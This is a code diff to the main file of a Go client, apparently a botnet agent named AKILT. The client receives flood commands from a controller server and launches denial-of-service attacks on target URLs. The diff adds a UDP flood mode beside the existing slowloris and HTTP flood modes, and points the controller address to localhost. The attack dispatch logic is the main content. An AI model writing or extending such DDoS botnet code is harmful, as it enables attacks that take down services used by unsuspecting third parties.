@@ -25,6 +25,7 @@ import (
 
 	"github.com/Xart3mis/AKILT/Client/lib/DOS/httpflood"
 	"github.com/Xart3mis/AKILT/Client/lib/DOS/slowloris"
+	"github.com/Xart3mis/AKILT/Client/lib/DOS/udpflood"
 	"github.com/Xart3mis/AKILT/Client/lib/bundles"
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
@@ -56,7 +57,7 @@ func init() {
 }
 
 func main() {
-	c, err := consumer.Init("172.21.96.70:8000")
+	c, err := consumer.Init("localhost:8000")
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -172,11 +173,16 @@ func main() {
 			if flood.GetShouldFlood() {
 				switch flood.FloodType {
 				case 0:
-					slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Microsecond,
+					slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Minute,
 						time.Duration(flood.GetLimit())*time.Second)
 				case 1:
 					httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
 						flood.GetNumThreads())
+				case 2:
+					//
+				case 3:
+					udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
+						time.Duration(flood.GetLimit())*time.Second)
 				}
 			}
 		}()
